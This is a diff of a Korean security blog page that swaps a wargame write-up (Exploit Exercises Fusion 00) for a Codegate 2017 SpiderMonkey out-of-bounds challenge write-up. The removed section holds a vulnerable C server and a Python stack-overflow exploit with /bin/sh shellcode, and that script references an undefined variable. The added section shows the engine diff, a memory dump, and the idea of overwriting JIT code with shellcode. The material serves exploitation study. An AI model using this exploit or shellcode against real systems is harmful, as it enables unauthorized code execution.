@@ -7,20 +7,20 @@
   
   
   
-  <title>exploit_exercise_fusion_00 | 귀찮다</title>
+  <title>Codegate 2017 quals - JS WORLD | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="문제 소스코드">
-<meta name="keywords" content="pwnable">
+  <meta name="description" content="javascript engine exploit은 처음이라 아래 링크를 보고 공부했다.https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/">
+<meta name="keywords" content="pwnable, javascript">
 <meta property="og:type" content="article">
-<meta property="og:title" content="exploit_exercise_fusion_00">
-<meta property="og:url" content="https://blog.haklog.xyz/2018/09/23/exploit-exercise-fusion-00/index.html">
+<meta property="og:title" content="Codegate 2017 quals - JS WORLD">
+<meta property="og:url" content="https://blog.haklog.xyz/2019/11/02/codegate 2017 quals - jsworld/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="문제 소스코드">
+<meta property="og:description" content="javascript engine exploit은 처음이라 아래 링크를 보고 공부했다.https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-25T10:20:02.000Z">
+<meta property="og:updated_time" content="2020-01-06T02:15:44.889Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="exploit_exercise_fusion_00">
-<meta name="twitter:description" content="문제 소스코드">
+<meta name="twitter:title" content="Codegate 2017 quals - JS WORLD">
+<meta name="twitter:description" content="javascript engine exploit은 처음이라 아래 링크를 보고 공부했다.https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/">
   
   
     <link rel="icon" href="/img/one.png">
@@ -244,11 +244,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-exploit-exercise-fusion-00" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-codegate 2017 quals - jsworld" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/09/23/exploit-exercise-fusion-00/" class="article-date">
-      <time datetime="2018-09-23T14:57:28.000Z" itemprop="datePublished">2018-09-23</time>
+      <a  href="/2019/11/02/codegate 2017 quals - jsworld/" class="article-date">
+      <time datetime="2019-11-02T11:35:01.000Z" itemprop="datePublished">2019-11-02</time>
 </a>
 
     </div>
@@ -262,7 +262,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      exploit_exercise_fusion_00
+      Codegate 2017 quals - JS WORLD
     </h1>
   
 
@@ -272,13 +272,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/wargame/">wargame</a>
+    <a class="article-category-link" href="/categories/pwanble/">pwanble</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-javascript/">pwnable, javascript</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -288,12 +288,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>문제 소스코드</p>
+        <p>javascript engine exploit은 처음이라 아래 링크를 보고 공부했다.<br><a href="https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/" target="_blank" rel="noopener">https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/</a></p>
 <a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;../common/common.c&quot;    </span><br><span class="line"> </span><br><span class="line">int fix_path(char *path)</span><br><span class="line">&#123;</span><br><span class="line">  char resolved[128];</span><br><span class="line">  </span><br><span class="line">  if(realpath(path, resolved) == NULL) return 1; // can&apos;t access path. will error trying to open</span><br><span class="line">  strcpy(path, resolved);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">char *parse_http_request()</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[1024];</span><br><span class="line">  char *path;</span><br><span class="line">  char *q;</span><br><span class="line"> </span><br><span class="line">  printf(&quot;[debug] buffer is at 0x%08x :-)\n&quot;, buffer);</span><br><span class="line"> </span><br><span class="line">  if(read(0, buffer, sizeof(buffer)) &lt;= 0) errx(0, &quot;Failed to read from remote host&quot;);</span><br><span class="line">  if(memcmp(buffer, &quot;GET &quot;, 4) != 0) errx(0, &quot;Not a GET request&quot;);</span><br><span class="line"> </span><br><span class="line">  path = &amp;buffer[4];</span><br><span class="line">  q = strchr(path, &apos; &apos;);</span><br><span class="line">  if(! q) errx(0, &quot;No protocol version specified&quot;);</span><br><span class="line">  *q++ = 0;</span><br><span class="line">  if(strncmp(q, &quot;HTTP/1.1&quot;, 8) != 0) errx(0, &quot;Invalid protocol&quot;);</span><br><span class="line"> </span><br><span class="line">  fix_path(path);</span><br><span class="line"> </span><br><span class="line">  printf(&quot;trying to access %s\n&quot;, path);</span><br><span class="line"> </span><br><span class="line">  return path;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int fd;</span><br><span class="line">  char *p;</span><br><span class="line"> </span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line">  set_io(fd);</span><br><span class="line"> </span><br><span class="line">  parse_http_request(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from socket import *</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">p = lambda x : struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HOST = &quot;192.168.111.129&quot;</span><br><span class="line">PORT = 20000</span><br><span class="line"> </span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((HOST,PORT))</span><br><span class="line"> </span><br><span class="line">#a = s.recv(1024)</span><br><span class="line"> </span><br><span class="line">#addr = a[21:31]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">shellcode =&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"> </span><br><span class="line">payload = &quot;GET &quot;</span><br><span class="line">payload += &quot;\x90&quot;*(139-len(addr+shellcode))</span><br><span class="line">payload += shellcode</span><br><span class="line">payload += p(0xbf8c55e8+20)</span><br><span class="line">payload += &quot; HTTP/1.1&quot;</span><br><span class="line"> </span><br><span class="line">s.send(payload)</span><br><span class="line">s.send(&quot;id&quot;)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<h2 id="VULN"><a href="#VULN" class="headerlink" title="VULN"></a>VULN</h2><p>spider monkey의 소스코드를 수정하여 oob 취약점을 발생시킨 문제이다. 소스코드를 디핑떠보면 다음과 같다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> [S] mozilla 2 diff jsarray.cpp mozjs-24.2.0/js/src/jsarray.cpp </span><br><span class="line">1947c1947,1950</span><br><span class="line">&lt; </span><br><span class="line">---</span><br><span class="line">&gt;     if (index == 0) &#123;</span><br><span class="line">&gt;         /* Step 4b. */</span><br><span class="line">&gt;         args.rval().setUndefined();</span><br><span class="line">&gt;     &#125; else &#123;</span><br><span class="line">1959c1962</span><br><span class="line">&lt; </span><br><span class="line">---</span><br><span class="line">&gt;     &#125;</span><br><span class="line">1964c1967</span><br><span class="line">&lt;     if (obj-&gt;isNative())</span><br><span class="line">---</span><br><span class="line">&gt;     if (obj-&gt;isNative() &amp;&amp; obj-&gt;getDenseInitializedLength() &gt; index)</span><br></pre></td></tr></table></figure>
 
+<p>index가 0임을 체크하는 부분을 삭제함으로써 oob 취약점을 발생시켰다.</p>
+<p>ARRAY 객체</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10gx 0x7ffff6a44ac0</span><br><span class="line">0x7ffff6a44ac0:	0x00007ffff6a475d8	0x00007ffff6a31820</span><br><span class="line">0x7ffff6a44ad0:	0x0000000000000000	0x00007ffff6a44af0</span><br><span class="line">0x7ffff6a44ae0:	0x0000000300000000	0xdeadbeef00000006</span><br><span class="line">0x7ffff6a44af0:	0xfff8800041414141	0xfff8800051515151</span><br><span class="line">0x7ffff6a44b00:	0xfff8800061616161	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>0x7ffff6a44ad8 부터 데이터의 주소, 실제 메모리의 배열 크기, 가상 배열 크기, 실제 데이터 등으로 이루어져있다.</p>
+<hr>
+<h2 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h2><p>공격 코드를 작성하기 전에 JIT에 대해 알아야한다. 통상 다른 컴파일은 미리 개발자가 작성한 코드를 기계어로 변환시켜놓지만, JIT(Just-in-time) 컴파일은 프로그램이 실행되는 시점에 바이트코드로 변환시키는 방법이다. </p>
+<p>실행될때마다 메모리에 코드가 올라가있는데, 이 코드를 쉘코드로 덮어버린 후 실행해버리면 우리가 원하는 코드를 실행시킬 수 있을 것이다.</p>
 
       
     </div>
@@ -302,28 +310,28 @@
   
     
     <div class="copyright">
-        <p><span>제목:</span><a  href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></p>
+        <p><span>제목:</span><a  href="/2019/11/02/codegate 2017 quals - jsworld/">Codegate 2017 quals - JS WORLD</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
-        <p><span>발행 시간:</span>2018년09월23일 - 23시57분</p>
-        <p><span>마지막 업데이트:</span>2018년09월25일 - 19시20분</p>
+        <p><span>발행 시간:</span>2019년11월02일 - 20시35분</p>
+        <p><span>마지막 업데이트:</span>2020년01월06일 - 11시15분</p>
     </div>
 
 
 
 <nav id="article-nav">
   
-    <a  href="/2018/09/24/exploit-exercise-fusion-01/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a  href="/2019/12/01/tcalc/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          exploit-exercise-fusion-01
+          hack.lu - tcalc
         
       </div>
     </a>
   
   
-    <a  href="/2018/09/23/gadget-searcher/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">gadget_searcher</div>
+    <a  href="/2019/11/01/kernelheap/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CISCN 2017 - Babydriver</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -335,7 +343,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">Article directory</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#VULN"><span class="toc-number">1.</span> <span class="toc-text">VULN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXPLOIT"><span class="toc-number">2.</span> <span class="toc-text">EXPLOIT</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -431,13 +439,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2018/09/24/exploit-exercise-fusion-01/" title="上一篇: exploit-exercise-fusion-01">
+            <a  href="/2019/12/01/tcalc/" title="上一篇: hack.lu - tcalc">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2018/09/23/gadget-searcher/" title="下一篇: gadget_searcher">
+            <a  href="/2019/11/01/kernelheap/" title="下一篇: CISCN 2017 - Babydriver">
                 <i class="fa fa-angle-right"></i>
             </a>
         
